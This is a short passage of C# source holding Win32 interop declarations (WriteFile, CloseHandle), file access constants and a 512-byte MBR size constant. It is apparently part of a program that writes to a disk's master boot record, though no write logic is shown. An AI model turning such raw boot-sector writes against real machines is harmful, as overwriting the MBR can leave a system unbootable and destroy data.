out uint lpNumberOfBytesWritten,
IntPtr lpOverlapped);

    private const uint GenericRead = 0x80000000;
    private const uint GenericWrite = 0x40000000;
    private const uint GenericExecute = 0x20000000;
    private const uint GenericAll = 0x10000000;

    private const uint FileShareRead = 0x1;
    private const uint FileShareWrite = 0x2;

    //dwCreationDisposition
    private const uint OpenExisting = 0x3;

    //dwFlagsAndAttributes
    private const uint FileFlagDeleteOnClose = 0x4000000;

    private const uint MbrSize = 512u;
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hHandle);
}